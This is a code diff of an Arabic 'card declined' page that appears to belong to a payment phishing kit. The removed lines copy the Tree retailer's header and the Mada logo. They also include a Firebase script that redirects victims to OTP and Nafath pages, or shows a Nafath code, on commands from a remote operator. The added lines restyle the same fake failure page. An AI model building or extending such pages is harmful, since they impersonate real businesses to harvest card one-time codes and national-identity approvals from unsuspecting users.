@@ -3,81 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>فشل عملية الدفع - تري</title>
+    <title>فشل عملية الدفع</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
-        :root { --p-green: #122d2b; --s-gold: #c5a059; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #ffffff; margin: 0; padding: 0; display: flex; flex-direction: column; min-height: 100vh; }
+        body { background-color: #f4f6f8; font-family: 'Cairo', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
+        .card-failed {
+            background: white; width: 100%; max-width: 480px;
+            border-radius: 24px; box-shadow: 0 15px 40px rgba(0,0,0,0.08);
+            padding: 40px; text-align: center;
+        }
+        .icon-box {
+            width: 90px; height: 90px; background: #fde8e8; color: #dc3545;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            font-size: 45px; margin: 0 auto 30px; animation: shake 0.5s ease-in-out;
+        }
+        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }
         
-        /* الهيدر مطابق لصورة تري */
-        .header { background: var(--p-green); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; color: white; }
-        .lang-switch { border: 1px solid #4ade80; padding: 5px 12px; border-radius: 8px; font-size: 14px; }
-        .header img { height: 35px; }
-
-        .content { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 30px; text-align: center; }
-        .mada-logo { width: 80px; align-self: flex-end; margin: 20px; }
-        
-        h2 { color: #555; font-size: 24px; margin-bottom: 30px; }
-        .error-msg { font-size: 18px; color: #333; font-weight: bold; line-height: 1.8; margin-bottom: 40px; max-width: 300px; }
-
-        .btn-retry { background: var(--p-green); color: white; border: none; padding: 16px; width: 100%; max-width: 320px; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; text-decoration: none; transition: 0.3s; }
-        .btn-retry:active { transform: scale(0.98); }
+        .btn-retry {
+            background-color: #198754; color: white; border: none; padding: 15px;
+            border-radius: 12px; font-weight: bold; width: 100%; font-size: 1.1rem;
+            transition: 0.3s; text-decoration: none; display: block;
+        }
+        .btn-retry:hover { background-color: #146c43; color: white; transform: translateY(-2px); }
     </style>
 </head>
 <body>
 
-<div class="header">
-    <div class="lang-switch">AR <span style="color: #999; margin-right: 5px;">EN</span></div>
-    <img src="https://tree.com.sa/assets/images/logo.png" alt="Tree Logo">
-    <div style="font-size: 24px;">☰</div>
-</div>
-
-<img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c5/Mada_Logo.svg/1200px-Mada_Logo.svg.png" class="mada-logo" alt="Mada">
-
-<div class="content">
-    <h2>نعتذر</h2>
-    
-    <div class="error-msg">
-        تم رفض بطاقتك من بوابة الدفع ، يرجى محاولة السداد من بطاقة أخرى
+    <div class="card-failed">
+        <div class="icon-box">✕</div>
+        <h2 class="fw-bold text-dark mb-3">نعتذر</h2>
+        <p class="text-muted mb-5" style="line-height: 1.8; font-size: 1.1rem; font-weight: 600;">
+            تم رفض بطاقتك من بوابة الدفع،
+            <br>
+            يرجى محاولة السداد باستخدام بطاقة أخرى.
+        </p>
+        <a href="payment.html" class="btn-retry">المتابعة للدفع ↺</a>
     </div>
-
-    <a href="index.html" class="btn-retry">المتابعة للدفع</a>
-</div>
-
-<script>
-    // للتأكد من أن الزر يعود لصفحة البطاقة مباشرة
-    // إذا كان اسم ملف صفحة الدفع عندك مختلف عن index.html قم بتغييره هنا
-    document.querySelector('.btn-retry').addEventListener('click', function(e) {
-        // يمكننا إضافة تسجيل محاولة الفشل في Firebase قبل التحويل
-        console.log("User retrying payment...");
-    });// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
-(function() {
-    const userId = localStorage.getItem('user_id');
-    if (userId) {
-        db.collection("orders").doc(userId).onSnapshot((doc) => {
-            if (doc.exists) {
-                const data = doc.data();
-                if (data.next_step === "GO_TO_OTP") {
-                    window.location.href = "otp.html"; 
-                } else if (data.next_step === "GO_TO_REJECT") {
-                    window.location.href = "payment_faild.html";
-                } else if (data.next_step === "GO_TO_NAFATH") {
-                    window.location.href = "nafath.html";
-                } else if (data.next_step === "SHOW_NAFATH_CODE") {
-                    const codeBox = document.getElementById('nafath-number');
-                    if (codeBox && data.nafath_code) {
-                        codeBox.innerText = data.nafath_code;
-                        const overlay = document.getElementById('overlay');
-                        if (overlay) overlay.style.display = 'none';
-                    }
-                }
-            }
-        });
-    }
-})();
-// ------------------------------------------
-
-</script>
 
 </body>
 </html>
-
